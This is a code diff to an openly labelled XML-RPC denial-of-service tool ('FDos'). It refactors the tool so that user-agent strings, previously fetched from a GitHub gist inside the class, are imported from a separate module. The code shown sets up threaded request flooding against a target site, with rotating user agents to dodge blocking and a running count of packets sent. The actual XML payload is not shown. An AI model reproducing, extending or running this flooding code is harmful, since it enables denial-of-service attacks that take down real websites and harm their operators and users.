@@ -2,13 +2,13 @@
 # FDos - XMLRPC DOS.                                        #
 #############################################################
 
-import random
 import requests
 import sys
 import threading
 import ctypes
 import os
 from urllib.parse import urlparse
+from ddos.ua_ref import user_agent
 requests.packages.urllib3.disable_warnings()
 
 class Xmlrpc:
@@ -21,14 +21,6 @@ class Xmlrpc:
     def att_sent(self):
         if os.name == "nt":
             ctypes.windll.kernel32.SetConsoleTitleW(f'Total Packet Sent : {self.packet_sent}')
-    def user_agent(self) -> str:
-        useragent = []
-        if useragent:
-            pass
-        else:
-            req = requests.get('https://gist.githubusercontent.com/fooster1337/d526ba3f963d8e8c9372a9e77486aa05/raw/f4782156809d4c960225fa7375b659e052d0e106/user-agent.txt').text.splitlines()
-            useragent.extend(req)
-        return random.choice(useragent)
     
     def send(self, site):
         # you can change if you want.
@@ -45,7 +37,7 @@ class Xmlrpc:
             self.att_sent()
             headers = {
                 "Accept": "*/*",
-                "User-Agent": self.user_agent(),
+                "User-Agent": user_agent(),
                 "Content-Type": "text/xml",
                 "Connection": "keep-alive",
                 "Content-Length": f"{len(payload)}"
